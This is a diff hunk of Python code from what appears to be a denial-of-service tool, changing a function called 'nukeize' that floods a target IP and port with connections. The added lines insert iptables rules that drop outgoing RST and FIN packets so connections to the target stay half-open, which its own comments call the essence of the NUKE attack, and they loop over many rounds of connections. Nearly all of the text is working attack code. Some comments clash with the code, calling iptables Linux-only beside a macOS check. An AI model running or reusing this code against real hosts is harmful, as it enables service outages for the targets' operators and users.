@@ -33,22 +33,33 @@ def nukeize(ip, port, rounds):
                 res_module.setrlimit(res_module.RLIMIT_NOFILE, (100000, 100000))
             except (ImportError, ValueError, OSError):
                 pass
-        # Note: iptables commands below are Linux-only; on Windows they will fail silently
-        epoll = select.epoll()
+        # Add iptables rules to prevent kernel from closing connections (essence of NUKE attack)
+        # These rules block RST and FIN packets from being sent locally, keeping connections half-open
+        if sys.platform.startswith("linux") or sys.platform == "darwin":
+            os.system('iptables -A OUTPUT -d %s -p tcp --dport %d --tcp-flags RST RST -j DROP' % (ip, port))
+            os.system('iptables -A OUTPUT -d %s -p tcp --dport %d --tcp-flags FIN FIN -j DROP' % (ip, port))
+        # Use select.select() for cross-platform compatibility (epoll only on Linux)
+        if sys.platform.startswith("linux"):
+            epoll = select.epoll()
+        else:
+            epoll = None
+            import warnings
+            warnings.warn("NUKE attack selected but epoll not available on this platform")
         connections = {}
         for x in range(int(rounds)):
             try:
                 n = n + 1
                 s = connect(ip, port)
                 print("[Info] [AI] [NUKE] Firing 'nuke' [" + str(n) + "] -> [SHOCKING!]")
-                connections[s.fileno()] = s
-                epoll.register(s.fileno(), select.EPOLLOUT | select.EPOLLONESHOT)
+                connections[s.fileno()] = s 
+                if epoll:
+                    epoll.register(s.fileno(), select.EPOLLOUT|select.EPOLLONESHOT)
             except Exception:
-                print("[Error] [AI] [NUKE] Failed to engage with 'nuke' [" + str(n) + "]")
+                print("[Error] [AI] [NUKE] Failed to engage with 'nuke' ["+str(n)+"]")
         # Restore iptables (Linux-only; no-op on Windows)
         if sys.platform.startswith("linux") or sys.platform == "darwin":
-            os.system('iptables -D OUTPUT -d %s -p tcp --dport %d --tcp-flags FIN FIN -j DROP' % (ip, port))
-            os.system('iptables -D OUTPUT -d %s -p tcp --dport %d --tcp-flags RST RST -j DROP' % (ip, port))
+            os.system('iptables -D OUTPUT -d %s -p tcp --dport %d --tcp-flags FIN FIN -j DROP' %(ip, port)) # restore IPTABLES
+            os.system('iptables -D OUTPUT -d %s -p tcp --dport %d --tcp-flags RST RST -j DROP' %(ip, port))
     except Exception:
         print("[Error] [AI] [NUKE] Failing to engage... -> Is still target online? -> [Checking!]")
 
